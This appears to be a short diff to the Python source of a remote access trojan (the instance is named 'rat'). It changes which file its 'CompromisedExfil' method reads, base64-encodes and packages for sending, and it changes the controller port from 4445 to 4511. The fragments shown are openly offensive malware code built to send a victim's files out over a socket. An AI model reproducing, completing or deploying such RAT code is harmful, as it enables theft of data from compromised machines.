@@ -21,7 +21,7 @@ class CLIENT:
         sock.send(information_send.encode())
 
     def CompromisedExfil(self):
-        file = open('kali.txt', "rb")
+        file = open('kali.pc', "rb")
         bytes = file.read(1024)
         base64_bytes = base64.b64encode(bytes)
         file_json = {
@@ -84,7 +84,7 @@ class CLIENT:
                 file.close()
 
                 
-rat = CLIENT('127.0.0.1', 4445)
+rat = CLIENT('127.0.0.1', 4511)
 
 if __name__ == '__main__':
     rat.connection()
